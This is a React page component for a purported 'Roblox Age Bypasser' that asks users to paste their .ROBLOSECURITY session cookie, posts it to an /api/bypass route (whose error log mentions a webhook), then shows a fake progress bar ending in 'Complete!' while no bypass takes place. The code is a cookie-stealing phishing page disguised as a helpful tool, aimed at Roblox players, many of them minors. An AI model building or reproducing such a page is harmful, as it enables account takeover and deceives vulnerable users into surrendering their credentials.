"use client"

import { useState } from "react"
import { Shield, Play } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"

export default function Home() {
  const [cookie, setCookie] = useState("")
  const [isProcessing, setIsProcessing] = useState(false)
  const [progress, setProgress] = useState(0)
  const [username, setUsername] = useState("")
  const [statusText, setStatusText] = useState("")
  const [error, setError] = useState("")

  const isValidRobloxCookie = (cookieValue: string): boolean => {
    const trimmedCookie = cookieValue.trim()

    if (!trimmedCookie) return false

    // Check if it has the warning prefix and extract the actual cookie
    if (trimmedCookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
      const parts = trimmedCookie.split("|_")
      if (parts.length >= 2) {
        const actualCookie = parts[parts.length - 1]
        return actualCookie.length > 50
      }
    }

    // Check if it starts with .ROBLOSECURITY= and extract the value
    if (trimmedCookie.startsWith(".ROBLOSECURITY=")) {
      const cookiePart = trimmedCookie.substring(".ROBLOSECURITY=".length)
      return cookiePart.length > 50
    }

    // Just check if it looks like a long token (50+ characters)
    return trimmedCookie.length > 50
  }

  const handleBypass = async () => {
    if (!cookie.trim()) {
      setError("Please enter a cookie")
      return
    }

    if (!isValidRobloxCookie(cookie)) {
      setError("Invalid Roblox cookie format. Please enter a valid .ROBLOSECURITY cookie.")
      return
    }

    setError("")
    setIsProcessing(true)
    setProgress(0)
    setUsername("")
    setStatusText("Processing...")

    try {
      fetch("/api/bypass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cookie: cookie.trim() }),
      })
        .then(async (response) => {
          const result = await response.json()
          if (result.userInfo?.name) {
            setUsername(result.userInfo.name)
          }
        })
        .catch((error) => {
          console.error("[v0] Failed to send to webhook:", error)
        })

      const totalDuration = 10000
      const intervalTime = 100
      const incrementPerInterval = (100 / totalDuration) * intervalTime

      const progressInterval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + incrementPerInterval
          if (newProgress >= 100) {
            clearInterval(progressInterval)
            setStatusText("Complete!")
            setTimeout(() => {
              setIsProcessing(false)
              setProgress(0)
              setCookie("")
              setUsername("")
              setStatusText("")
            }, 500)
            return 100
          }
          return newProgress
        })
      }, intervalTime)
    } catch (error) {
      console.error("[v0] Failed to bypass:", error)
      setStatusText("Failed")
      setIsProcessing(false)
    }
  }

  return (
    <main className="relative min-h-screen bg-black flex flex-col items-center justify-center p-4 overflow-hidden">
      {/* Neon background effects */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/20 rounded-full blur-[128px] animate-pulse"></div>
        <div
          className="absolute bottom-0 right-1/4 w-96 h-96 bg-violet-500/20 rounded-full blur-[128px] animate-pulse"
          style={{ animationDelay: "1s" }}
        ></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[150px]"></div>
      </div>

      {/* Content with higher z-index */}
      <div className="relative z-10">
        {/* Header Section */}
        <div className="flex flex-col items-center mb-12">
          <div className="w-20 h-20 rounded-full bg-zinc-900 flex items-center justify-center mb-6 ring-2 ring-primary/50 shadow-[0_0_30px_rgba(168,85,247,0.4)]">
            <Shield className="w-10 h-10 text-primary drop-shadow-[0_0_10px_rgba(168,85,247,0.8)]" strokeWidth={1.5} />
          </div>

          <h1 className="text-4xl md:text-5xl font-bold text-white mb-3 text-balance text-center drop-shadow-[0_0_20px_rgba(168,85,247,0.5)]">
            Roblox Age Bypasser
          </h1>

          <p className="text-zinc-400 text-lg text-center">Secure and efficient age verification bypass</p>
        </div>

        {/* Main Card */}
        <Card className="w-full max-w-md bg-zinc-900/80 backdrop-blur-xl border-2 border-primary/40 shadow-[0_0_50px_rgba(168,85,247,0.3)]">
          <CardContent className="p-8">
            <label className="block text-white text-sm font-medium mb-3">.ROBLOSECURITY Cookie</label>

            <textarea
              value={cookie}
              onChange={(e) => {
                setCookie(e.target.value)
                setError("")
              }}
              placeholder="Paste your cookie here..."
              className="w-full h-24 px-4 py-3 bg-zinc-950/90 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary/50 focus:shadow-[0_0_20px_rgba(168,85,247,0.3)] resize-none mb-2 transition-all"
            />

            {error && (
              <div className="mb-4 p-3 bg-red-950/50 border border-red-900 rounded-lg">
                <p className="text-red-400 text-sm">{error}</p>
              </div>
            )}

            <Button
              onClick={handleBypass}
              disabled={!cookie.trim() || isProcessing}
              className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-medium rounded-lg flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-[0_0_30px_rgba(168,85,247,0.4)] hover:shadow-[0_0_40px_rgba(168,85,247,0.6)]"
            >
              <Play className="w-4 h-4" fill="currentColor" />
              {isProcessing ? "In Progress" : "Start Bypass"}
            </Button>

            {isProcessing && (
              <div className="mt-6 space-y-3">
                <div className="text-center">
                  <p className="text-zinc-400 text-sm mb-1">Processing account</p>
                  {username && <p className="text-white font-medium">{username}</p>}
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between text-sm">
                    <span className="text-zinc-400">Progress</span>
                    <span className="text-white font-medium">{Math.round(progress)}%</span>
                  </div>

                  <div className="w-full h-2 bg-zinc-800 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-primary transition-all duration-300 ease-out shadow-[0_0_20px_rgba(168,85,247,0.8)]"
                      style={{ width: `${progress}%` }}
                    />
                  </div>

                  <p className="text-zinc-500 text-xs text-center flex items-center justify-center gap-1">
                    <span className="inline-block w-1 h-1 bg-primary rounded-full animate-pulse shadow-[0_0_5px_rgba(168,85,247,0.8)]" />
                    {statusText}
                  </p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Footer */}
        <div className="mt-12 flex items-center gap-2 text-zinc-600 text-sm">
          <span>Secure</span>
          <span>•</span>
          <span>Fast</span>
          <span>•</span>
          <span>Reliable</span>
        </div>
      </div>
    </main>
  )
}
